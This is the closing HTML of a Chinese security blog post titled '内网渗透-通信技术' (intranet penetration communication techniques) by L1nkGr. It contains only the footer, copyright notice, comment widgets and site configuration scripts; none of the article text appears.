<i class="fa fa-external-link-alt"></i></a></p></div><footer class=post-footer><div class=post-tags><a href=/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/>内网渗透</a></div><div class=post-share-tools><div class=post-share-loading><i class="fa-solid fa-ellipsis fa-spin"></i></div><div class="a2a_kit a2a_kit_size_32 a2a_default_style"><a class=a2a_dd href=https://www.addtoany.com/share></a><a class=a2a_button_wechat></a><a class=a2a_button_qzone></a><a class=a2a_button_sina_weibo></a><a class=a2a_button_douban></a><a class=a2a_button_facebook></a><a class=a2a_button_x></a><a class=a2a_button_email></a><a class=a2a_button_printfriendly></a></div></div><hr><div class=post-copyright><img src=/imgs/cc/cc.svg class=cc-icon width=75 height=75 align=right alt=共享知识 title=共享知识><ul><li class=post-copyright-title><strong>文章标题：</strong>
内网渗透-通信技术</li><li class=post-copyright-author><strong>本文作者： </strong>L1nkGr</li><li class=post-copyright-link><strong>本文链接：</strong>
<a id=post-cr-link href=https://blog.000k.de/post/2023/11/13StudyNeiWang.html title=内网渗透-通信技术>https://blog.000k.de/post/2023/11/13StudyNeiWang.html</a></li><li class=post-copyright-license><strong>版权声明： </strong>本作品采用 <i class="fab fa-fw fa-creative-commons"></i><a target=_blank href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans>BY-NC-SA</a> 许可协议。转载请注明出处！</li><li><div class=license-icons><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans target=_blank><img src=/imgs/cc/big/by_nc_sa.svg alt=BY-NC-SA title=BY-NC-SA>
</a><a href=https://notbyai.fyi target=_blank><img src=/imgs/notbyai/zh-hans/white.svg title="Not By AI"></a></div></li></ul></div><div class=followme><span>欢迎关注我的其它发布渠道</span><div class=social-list><div class=social-item><a target=_blank class=social-link href=/images/wechat_channel.jpg><span class=icon><i class="fab fa-weixin"></i>
</span><span class=label>WeChat</span></a></div><div class=social-item><a target=_blank class=social-link href=/rss.xml><span class=icon><i class="fa fa-rss"></i>
</span><span class=label>RSS</span></a></div></div></div><div class=post-nav><div class="post-nav-next post-nav-item"><a href=/post/fastkeyboard.html rel=next title=快捷键汇总><i class="fa fa-chevron-left"></i> 快捷键汇总</a></div><div class="post-nav-prev post-nav-item"><a href=/post/GEEK%E2%80%99sWriteUp.html rel=prev title=GEEK极客部分WriteUp>GEEK极客部分WriteUp
<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div><div id=comments class=post-comments><div class=comment-head><div class=comment-headline><i class="fas fa-comments fa-fw"></i>
<span>评论交流</span></div></div><div class=comment-wrap><div><div class=comment-loading><i class="fa fa-sync fa-spin"></i></div><div id=lv-container data-id=city data-uid="MTAyMC82MDczNi8zNzIwNw=="></div></div></div></div></div></main><footer class=footer><div class=footer-inner><div id=i18n-translate class=i18n-translate><i class="fa fa-language"></i><div id=lang-select class=lang-select><div id=lang-selected class=selected-option><span class="flag-icon flag-icon-zh-cn"></span>
<span class=selected-language>简体中文</span>
<i class="fa fa-chevron-down"></i></div><div id=lang-options class=lang-options><div class=lang-option lang-code=zh-cn lang-name=简体中文 lang-url=/post/2023/11/13StudyNeiWang.html><span class="flag-icon flag-icon-zh-cn"></span>
<span class=lang-name>简体中文</span></div></div></div></div><div class=copyright>&copy;
<span itemprop=copyrightYear>2023 - 2025
</span><span class=with-love><i class="fa fa-heart"></i>
</span><span class=author itemprop=copyrightHolder>L1nkGr</span></div><div class=beian><a href=# id=hitokoto_text>:D 获取中...</a><br><a href="https://icp.gov.moe/?keyword=20250977" target=_blank>萌ICP备20250977号</a>
<a href=https://blogscn.fun/ title=BLOGS·CN target=_blank><img src=https://photo.xiangming.site/img/blogscn.png alt=本站已加入BLOGS·CN style=width:auto;height:15px> </a><a href=https://www.foreverblog.cn/go.html target=_blank><img src=https://img.foreverblog.cn/wormhole_4_tp.gif alt style=width:auto;height:32px title=穿梭虫洞-随机访问十年之约友链博客></a></div><script>fetch("https://v1.hitokoto.cn").then(e=>e.json()).then(e=>{const t=document.querySelector("#hitokoto_text");t.href=`https://hitokoto.cn/?uuid=${e.uuid}`,t.innerText=e.hitokoto}).catch(console.error)</script></div></footer><script class=next-config data-name=page type=application/json>{"clipboard":{"js":{"alias":"clipboard","file":"dist/clipboard.min.js","name":"clipboard.js","version":"2.0.11"}},"comments":true,"expired":false,"isHome":false,"isPage":true,"path":"13StudyNeiWang.html","permalink":"https://blog.000k.de/post/2023/11/13StudyNeiWang.html","title":"内网渗透-通信技术","toc":true}</script><script type=text/javascript src=https://blog.000k.de/js/3rd/animejs/3.2.2/anime.min.js crossorigin=anonymous defer></script><script type=text/javascript src=https://blog.000k.de/js/3rd/viewerjs/1.11.6/viewer.min.js crossorigin=anonymous defer></script><script class=next-config data-name=main type=application/json>{"bookmark":{"color":"#222","enable":true,"save":"manual"},"copybtn":true,"darkmode":true,"giscus":{"cfg":{"category":"General","categoryid":"DIC_kwDOJ9_vEs4CejNU","emit":true,"inputposition":"top","mapping":"pathname","reactions":false,"repo":"00ye/00ye.github.io","repoid":"R_kgDOJ9_vEg","theme":"preferred_color_scheme"},"js":"https://giscus.app/client.js"},"hostname":"https://blog.000k.de/","i18n":{"ds_day":" 天前","ds_days":" 天 ","ds_hour":" 小时前","ds_hours":" 小时 ","ds_just":"刚刚","ds_min":" 分钟前","ds_mins":" 分钟","ds_month":" 个月前","ds_years":" 年 ","empty":"没有找到任何搜索结果：${query}","hits":"找到 ${hits} 个搜索结果","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","placeholder":"搜索..."},"isMultiLang":true,"lang":"zh-CN","lazyload":false,"livere":{"js":"https://cdn-city.livere.com/js/embed.dist.js"},"localSearch":{"enable":true,"limit":1e3,"path":"/searchindexes.xml","preload":false,"topnperarticle":-1,"trigger":"auto","unescape":false},"motion":{"async":true,"enable":true,"transition":{"collheader":"bounceInDown","postblock":"bounceInDown","postbody":"bounceInDown","postheader":"bounceInDown","sidebar":"bounceInDown"}},"postmeta":{"comments":{"enable":false,"plugin":"waline"},"views":{"enable":true,"plugin":"busuanzi"}},"root":"/","scheme":"Gemini","share":{"addtoany":{"js":"https://static.addtoany.com/menu/page.js","locale":"zh-CN","num":8},"enable":true},"sidebar":{"display":"post","offset":12,"padding":18,"position":"left","width":256},"twikoo":{"cfg":{"envid":"http://192.168.31.50:8080","region":"ap-guangzhou"},"js":{"file":"dist/twikoo.all.min.js","name":"twikoo","version":"1.6.41"}},"vendor":{"plugins":"local","router":{"name":"local","type":"modern","url":"https://blog.000k.de/js/3rd"}},"version":"4.7.3","waline":{"cfg":{"emoji":false,"imguploader":false,"placeholder":"请文明发言哟 ヾ(≧▽≦*)o","reaction":true,"reactiontext":["点赞","踩一下","得意","不屑","尴尬","睡觉"],"reactiontitle":"你认为这篇文章怎么样？","requiredmeta":["nick","mail"],"serverurl":null,"sofa":"快来发表你的意见吧 (≧∀≦)ゞ","wordlimit":200},"css":{"alias":"@waline/client","file":"dist/waline.css","name":"waline","version":"2.15.8"},"js":{"alias":"@waline/client","file":"dist/waline.js","name":"waline","version":"2.15.8"}}}</script><script type=text/javascript src="/js/main.min.js?=1749997045" defer></script><script type=text/javascript src="/js/clipboard.min.js?=1749997045" defer></script></body></html>